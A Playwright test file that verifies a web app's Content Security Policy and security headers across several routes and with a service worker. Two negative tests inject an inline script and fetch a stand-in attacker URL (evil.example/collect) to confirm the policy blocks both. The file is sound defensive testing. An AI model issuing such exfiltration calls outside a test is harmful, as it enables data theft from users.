import { expect, test } from "@playwright/test";
import { stubApi } from "./support/stub-api";

// Served by tools/serve-dist.ts: the real dist with the real dist/_headers (second webServer of playwright.config.ts).
test.use({ baseURL: "http://localhost:4174" });

type Probe = { __csp: string[] };
const ROUTES = ["/", "/quotes?symbol=MSFT", "/about", "/auth/sign-in"];

test.beforeEach(async ({ page }) => {
  await stubApi(page);
  await page.addInitScript(() => {
    const w = window as unknown as Probe;
    w.__csp = [];
    document.addEventListener("securitypolicyviolation", (e) => {
      w.__csp.push(`${e.violatedDirective} ${e.blockedURI}`);
    });
  });
});

test.describe("without the service worker", () => {
  test.use({ serviceWorkers: "block" });

  for (const route of ROUTES) {
    test(`no CSP violation and enforced headers on ${route}`, async ({ page }) => {
      const consoleCsp: string[] = [];
      page.on("console", (m) => {
        if (/content security policy/i.test(m.text())) consoleCsp.push(m.text());
      });
      const response = await page.goto(route);
      await page.waitForLoadState("networkidle");
      const headers = response?.headers() ?? {};
      expect(headers["content-security-policy"]).toContain("script-src 'self'");
      expect(headers["content-security-policy-report-only"]).toBeUndefined();
      expect(headers["x-frame-options"]).toBe("DENY");
      expect(headers["x-content-type-options"]).toBe("nosniff");
      expect(await page.evaluate(() => (window as unknown as Probe).__csp)).toEqual([]);
      expect(consoleCsp).toEqual([]);
    });
  }

  test("an injected inline script is blocked", async ({ page }) => {
    await page.goto("/about");
    const executed = await page.evaluate(() => {
      const script = document.createElement("script");
      script.textContent = "window.__injected = true";
      document.head.append(script);
      return (window as unknown as { __injected?: boolean }).__injected === true;
    });
    expect(executed).toBe(false);
    await page.waitForFunction(() => (window as unknown as Probe).__csp.length > 0);
    const seen = await page.evaluate(() => (window as unknown as Probe).__csp);
    expect(seen.some((entry) => entry.startsWith("script-src"))).toBe(true);
  });

  test("a connection to another origin is blocked", async ({ page }) => {
    await page.goto("/about");
    const outcome = await page.evaluate(() =>
      fetch("https://evil.example/collect").then(
        () => "allowed",
        () => "blocked",
      ),
    );
    expect(outcome).toBe("blocked");
    const seen = await page.evaluate(() => (window as unknown as Probe).__csp);
    expect(seen.some((entry) => entry.startsWith("connect-src"))).toBe(true);
  });
});

test.describe("with the service worker", () => {
  test.use({ serviceWorkers: "allow" });

  test("the worker registers under the policy without violations", async ({ page }) => {
    await page.goto("/");
    const scope = await page.evaluate(async () => (await navigator.serviceWorker.ready).scope);
    expect(scope).toBe("http://localhost:4174/");
    expect(await page.evaluate(() => (window as unknown as Probe).__csp)).toEqual([]);
  });
});
